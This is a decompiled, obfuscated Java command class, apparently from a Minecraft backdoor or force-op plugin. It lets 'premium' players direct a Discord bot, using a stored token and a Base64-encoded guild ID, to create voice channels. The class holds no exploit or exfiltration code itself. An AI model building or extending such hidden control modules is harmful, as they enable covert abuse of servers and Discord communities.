/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import com.minecraftforceop.jda.jda.api.entities.Guild;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class CreatevcCommand
extends Command {
    public CreatevcCommand() {
        CreatevcCommand llllllllllllllIllllIllIlIIlIllII;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core llllllllllllllIllllIllIlIIlIIIlI, String llllllllllllllIllllIllIlIIlIIIIl, String[] llllllllllllllIllllIllIlIIIlllIl, Player llllllllllllllIllllIllIlIIIlllII) {
        if (llllllllllllllIllllIllIlIIlIIIlI.premium.contains(llllllllllllllIllllIllIlIIIlllII.getName())) {
            if (llllllllllllllIllllIllIlIIlIIIlI.botEnabled) {
                byte[] llllllllllllllIllllIllIlIIlIIlIl = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild llllllllllllllIllllIllIlIIlIIlII = llllllllllllllIllllIllIlIIlIIIlI.jda.getGuildById(new String(llllllllllllllIllllIllIlIIlIIlIl));
                if (llllllllllllllIllllIllIlIIlIIlII == null) {
                    llllllllllllllIllllIllIlIIIlllII.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else {
                    if (llllllllllllllIllllIllIlIIIlllIl.length <= 1) {
                        llllllllllllllIllllIllIlIIlIIlII.createVoiceChannel("Wendellmeset").complete();
                    } else {
                        llllllllllllllIllllIllIlIIlIIlII.createVoiceChannel(llllllllllllllIllllIllIlIIIlllIl[1]).complete();
                    }
                    llllllllllllllIllllIllIlIIIlllII.sendMessage(Settings.PREFIX("New channel created!"));
                }
            } else {
                llllllllllllllIllllIllIlIIIlllII.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            llllllllllllllIllllIllIlIIIlllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

